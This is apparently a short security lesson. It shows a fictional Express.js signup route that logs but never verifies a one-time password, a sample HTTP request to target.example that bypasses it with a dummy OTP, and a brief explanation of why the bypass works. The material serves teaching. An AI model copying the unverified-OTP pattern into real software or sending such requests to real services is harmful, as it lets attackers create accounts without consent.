lesson.example:
**Fictional vulnerable code (target.example)**
```js
// Express.js route handling signup
app.post('/api/signup', (req, res) => {
  const {email, phone, otp} = req.body; // otp = one‑time password sent to user
  // BUG: The OTP is only logged, never verified!
  console.log('Received OTP:', otp);
  // Create user record without checking otp
  createUser({email, phone});
  res.json({status:'ok'});
});
```
**Exploit request**
```
POST https://target.example/api/signup HTTP/1.1
Content-Type: application/json

{"email":"attacker@example.com","phone":"1234567890","otp":"000000"}
```
**Why it works**: The server reads the `otp` field but never compares it to the value it generated. Because there is no verification step, any string (even a dummy like `000000`) is accepted, and the account is created. (The term *endpoint* is the URL that receives the request; *payload* is the data sent in the request body.)

